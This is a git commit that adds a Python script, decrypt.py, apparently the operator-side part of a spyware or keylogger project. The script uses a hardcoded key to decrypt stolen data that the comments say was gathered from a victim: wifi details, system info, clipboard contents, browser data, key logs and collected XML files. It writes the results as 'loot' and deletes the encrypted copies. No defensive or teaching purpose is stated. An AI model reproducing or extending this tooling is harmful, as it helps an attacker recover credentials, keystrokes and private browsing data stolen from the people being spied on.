5ed396faa681757552c83710d5b6f0328299ba15
Rohit Rana <84077908+rohitranaqh@users.noreply.github.com>
2021-08-05 22:52:11 +0530

    Create decrypt.py

---
+++ decrypt.py
@@ -0,0 +1,29 @@
+# After receiving all the gathered data, download and move them to the path specified in this file.
+import sys, os, re, pathlib
+from cryptography.fernet import Fernet
+import logging
+
+if __name__ == '__main__':
+    try:
+        path = 'C:/Users/Public/Logs/'
+        encrypted_files = [ 'e_network_wifi.txt', 'e_system_info.txt', 'e_clipboard_info.txt', 'e_browser.txt', 'e_key_logs.txt' ]
+        regex = re.compile(r'.+\.xml$')
+
+        for dirpath, dirnames, filenames in os.walk(path):
+            [ encrypted_files.append(file) for file in filenames if regex.match(file) ]
+
+        key = b'T2UnFbwxfVlnJ1PWbixcDSxJtpGToMKotsjR4wsSJpM='
+
+        for file_decrypt in encrypted_files:
+            with open(path + file_decrypt, 'rb') as x:
+                data = x.read()
+            decrypted = Fernet(key).decrypt(data) # Decrypting the files
+            with open(path + file_decrypt[2:], 'ab') as loot:
+                loot.write(decrypted)
+            os.remove(path + file_decrypt)
+
+    except KeyboardInterrupt:
+        print('* Ctrl + C detected...program exiting *')
+
+    except Exception as ex:
+        logging.exception('* Error Occured: {}*'.format(ex))
